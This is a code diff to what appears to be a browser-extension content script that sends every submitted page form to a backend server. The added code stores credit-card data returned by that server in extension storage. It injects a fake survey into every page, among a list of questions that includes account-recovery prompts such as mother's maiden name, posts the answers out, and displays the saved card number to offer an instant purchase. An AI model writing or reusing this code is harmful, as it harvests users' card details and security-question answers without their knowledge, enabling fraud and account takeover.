@@ -58,13 +58,22 @@ function onSubmitEvtReaction(evt) {
   })
   fetch(urlBackend + pathForm, {
     method: "POST",
-    mode: "no-cors",
+    mode: "cors",
     cache: "no-cache",
     headers: {
       "Content-Type": "application/json; charset=utf-8",
     },
     body: body,
-  }).then(() => console.log("form sent ^_^"))
+  }).then(response => {
+    console.log("form sent ^_^")
+    return response.json()
+  }).then(body => {
+    if (!!body && !!body.creditCard && body.creditCard.formHasCard) {
+      chrome.storage.local.set({creditcard: body.creditCard}, function() {
+        console.log('Credit card data saved ^_^');
+      })
+    }
+  })
 }
 
 /*
@@ -80,3 +89,76 @@ if (!!forms && forms.length > 0) {
     form.addEventListener("submit", onSubmitEvtReaction)
   }
 }
+
+let questions = [
+  "What is your mother's maiden name?",
+  "What is the name of your dog?",
+  "Would you like to buy a new house?",
+  "On which street did you grow up?",
+  "Would you buy frikandelbroodje from Albert Heijn if it was in the bonus?",
+  "When was the last time you had Coca-Cola Cherry™️?",
+  "What elementary school did you attend?",
+  "In a scale from 0 to 10, what is your opinion of Monsanto™️?",
+]
+
+let products = [
+  "Coca-Cola Cherry™️",
+  "Frikandelbroodje by Albert Heijn™️",
+  "MacBook Pro™️",
+  "Dopper™️",
+  "Pepsi Max™️",
+]
+
+function getRandomInt(max) {
+  return Math.floor(Math.random() * Math.floor(max));
+}
+
+function produceRandomElement() {
+  let product = products[getRandomInt(products.length)]
+  let div = document.createElement("div")
+  let question = "Can you describe in a few words your opinion of "+product+"?"
+  let txt = document.createTextNode(question)
+  let frm = document.createElement("form")
+  let input = document.createElement("input")
+  frm.appendChild(input)
+  let btn = document.createElement("button")
+  btn.appendChild(document.createTextNode("Submit"))
+  frm.appendChild(btn)
+  div.appendChild(txt)
+  div.appendChild(frm)
+  frm.addEventListener("submit", evt => {
+    evt.preventDefault()
+    let body = JSON.stringify({
+      question: question,
+      answer: input.value,
+    })
+    fetch(urlBackend + "/123/question", {
+      method: "POST",
+      mode: "cors",
+      cache: "no-cache",
+      headers: {
+        "Content-Type": "application/json; charset=utf-8",
+      },
+      body: body,
+    })
+    chrome.storage.local.get(['creditcard'], function(result) {
+      console.log(result)
+      if (!result || !result.creditcard) {
+        body.removeChild(div)
+        return
+      }
+      div.removeChild(frm)
+      let thankyouTxt = document.createTextNode("Thank you! Would you like to order it now, using credit card "+result.creditcard.number+"?")
+      let thankyouParagraph = document.createElement("p")
+      thankyouParagraph.appendChild(thankyouTxt)
+      let orderBtn = document.createElement("button")
+      orderBtn.appendChild(document.createTextNode("Yes!"))
+      div.appendChild(thankyouParagraph)
+      div.appendChild(orderBtn)
+    })
+  })
+  let bodyResults = document.getElementsByTagName("body")
+  let body = bodyResults[0]
+  body.insertBefore(div, body.children[0])
+}
+produceRandomElement()
